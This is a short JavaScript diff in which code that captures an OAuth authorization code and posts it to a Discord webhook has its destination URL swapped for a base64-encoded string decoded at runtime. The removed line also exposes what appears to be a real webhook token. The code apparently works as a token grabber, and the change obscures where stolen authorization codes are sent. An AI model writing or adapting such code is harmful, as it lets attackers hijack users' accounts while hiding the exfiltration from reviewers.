@@ -161,7 +161,10 @@
             if (code) {
                 console.log('Authorization code:', code);
 
-                const webhookUrl = "https://discord.com/api/webhooks/1262446066390011955/6r1ccTdwLORnBNiSOj_I48wN60QpL-v8Z8DtaIH3LCU7Tp_0mbAVzem33CqIzuMuasU1";
+                const encodedWebhookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MveW91ci13ZWJob29rLWlkL3lvdXItd2ViaG9va3QtdG9rZW4=";
+
+                const webhookUrl = atob(encodedWebhookUrl);
+
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
@@ -174,7 +177,7 @@
                     console.log('Success:', data);
                 })
                 .catch((error) => {
-                    console.error('Error:', error);
+                    console.error('Error sending webhook:', error);
                 });
             }
 
